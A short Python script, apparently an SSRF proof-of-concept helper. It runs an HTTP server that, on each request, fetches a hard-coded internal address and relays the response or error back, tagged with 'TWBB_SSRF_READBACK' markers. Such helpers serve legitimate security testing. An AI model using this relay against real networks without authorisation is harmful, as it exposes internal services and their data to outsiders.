import http.server, socketserver, urllib.request, os
PORT=int(os.environ.get("PORT","8080"))
TARGET="http://192.168.4.72:8000/"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            r=urllib.request.urlopen(TARGET,timeout=8)
            body=r.read()[:2000]
            out=b"TWBB_SSRF_READBACK status=%d\n"%r.status + body
        except Exception as e:
            out=b"TWBB_SSRF_ERR "+str(e).encode()[:300]
        self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers(); self.wfile.write(out)
    def log_message(self,*a): pass
socketserver.TCPServer(("",PORT),H).serve_forever()
